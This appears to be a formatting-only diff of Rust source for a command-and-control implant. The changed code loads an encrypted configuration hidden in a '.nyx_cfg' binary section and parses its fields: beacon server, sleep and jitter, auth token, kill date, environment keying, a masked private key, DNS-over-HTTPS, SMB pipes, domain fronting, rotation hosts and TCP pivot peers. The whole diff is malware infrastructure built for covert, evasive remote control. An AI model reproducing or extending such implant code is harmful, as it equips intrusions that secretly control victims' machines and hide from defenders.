@@ -91,12 +91,31 @@ pub fn load_runtime_config() -> Option<(crate::config::Config, ImplantConfig, Ve
         &implant_priv,
         ct_with_tag,
     )?;
-    let (server_host, server_port, beacon_uri, sleep_seconds, jitter_pct, use_tls, auth_token,
-         features_bitmap, expires_at, channel_tail) =
-        load_runtime_config_parse_fields(&plaintext)?;
-    let (primary_channel, fallback_bitmap, doh_resolver, smb_pipe_name, extc2_api_host,
-         extc2_token, rotation_hosts, fronting_host, proxy_server, tcp_peer_host,
-         tcp_peer_port) = channel_tail;
+    let (
+        server_host,
+        server_port,
+        beacon_uri,
+        sleep_seconds,
+        jitter_pct,
+        use_tls,
+        auth_token,
+        features_bitmap,
+        expires_at,
+        channel_tail,
+    ) = load_runtime_config_parse_fields(&plaintext)?;
+    let (
+        primary_channel,
+        fallback_bitmap,
+        doh_resolver,
+        smb_pipe_name,
+        extc2_api_host,
+        extc2_token,
+        rotation_hosts,
+        fronting_host,
+        proxy_server,
+        tcp_peer_host,
+        tcp_peer_port,
+    ) = channel_tail;
 
     let cfg = crate::config::Config {
         server_host,
@@ -133,20 +152,19 @@ pub fn load_runtime_config() -> Option<(crate::config::Config, ImplantConfig, Ve
 /// Stage 1 — locate the ciphertext in the `.nyx_cfg` section and recover the
 /// keying material: `(keying_levels, config_nonce, server_pub, implant_priv,
 /// ct_with_tag)`. `None` → the caller falls back to the compile-time config.
-fn load_runtime_config_locate_ct() -> Option<(
-    u32,
-    [u8; 12],
-    [u8; 32],
-    [u8; 32],
-    &'static [u8],
-)> {
-    let section: &'static [u8] = unsafe {
-        core::slice::from_raw_parts(&NYX_CFG_PLACEHOLDER as *const u8, 1024)
-    };
+fn load_runtime_config_locate_ct() -> Option<(u32, [u8; 12], [u8; 32], [u8; 32], &'static [u8])> {
+    let section: &'static [u8] =
+        unsafe { core::slice::from_raw_parts(&NYX_CFG_PLACEHOLDER as *const u8, 1024) };
     let (keying_levels, config_nonce, data_len) = load_runtime_config_read_header(section)?;
     let (server_pub, implant_priv, ct_with_tag) =
         load_runtime_config_unmask_keys(section, data_len)?;
-    Some((keying_levels, config_nonce, server_pub, implant_priv, ct_with_tag))
+    Some((
+        keying_levels,
+        config_nonce,
+        server_pub,
+        implant_priv,
+        ct_with_tag,
+    ))
 }
 
 /// Parse the `.nyx_cfg` header: magic + env-keying bitmap + config data length
@@ -247,8 +265,19 @@ fn load_runtime_config_parse_fields(
     Option<[u8; 32]>,
     u32,
     u64,
-    (u8, u8, crate::heap::String, crate::heap::String, crate::heap::String, crate::heap::String,
-     crate::heap::String, crate::heap::String, crate::heap::String, crate::heap::String, u16),
+    (
+        u8,
+        u8,
+        crate::heap::String,
+        crate::heap::String,
+        crate::heap::String,
+        crate::heap::String,
+        crate::heap::String,
+        crate::heap::String,
+        crate::heap::String,
+        crate::heap::String,
+        u16,
+    ),
 )> {
     // The plaintext contains: [server_host str][server_port u16][beacon_uri str]
     //   [sleep_seconds u32][jitter_pct u8][use_tls u8]
@@ -322,9 +351,19 @@ fn load_runtime_config_kill_date(r: &mut Reader) -> Option<u64> {
 /// empty channel params.
 fn load_runtime_config_parse_tail(
     r: &mut Reader,
-) -> Option<(u8, u8, crate::heap::String, crate::heap::String, crate::heap::String,
-            crate::heap::String, crate::heap::String, crate::heap::String,
-            crate::heap::String, crate::heap::String, u16)> {
+) -> Option<(
+    u8,
+    u8,
+    crate::heap::String,
+    crate::heap::String,
+    crate::heap::String,
+    crate::heap::String,
+    crate::heap::String,
+    crate::heap::String,
+    crate::heap::String,
+    crate::heap::String,
+    u16,
+)> {
     if r.remaining() > 0 {
         let pc = r.u8().ok()?;
         let fb = r.u8().ok()?;
@@ -336,7 +375,11 @@ fn load_runtime_config_parse_tail(
         let (rh, fh, ps) = if r.remaining() > 0 {
             (r.str().ok()?, r.str().ok()?, r.str().ok()?)
         } else {
-            (crate::heap::String::new(), crate::heap::String::new(), crate::heap::String::new())
+            (
+                crate::heap::String::new(),
+                crate::heap::String::new(),
+                crate::heap::String::new(),
+            )
         };
         // spec-3 raw pivot fields — further backward compat layer.
         let (tcp_peer_host, tcp_peer_port) = if r.remaining() > 0 {
@@ -344,7 +387,19 @@ fn load_runtime_config_parse_tail(
         } else {
             (crate::heap::String::new(), 0u16)
         };
-        Some((pc, fb, dr, sp, eh, et, rh, fh, ps, tcp_peer_host, tcp_peer_port))
+        Some((
+            pc,
+            fb,
+            dr,
+            sp,
+            eh,
+            et,
+            rh,
+            fh,
+            ps,
+            tcp_peer_host,
+            tcp_peer_port,
+        ))
     } else {
         Some((
             0u8,
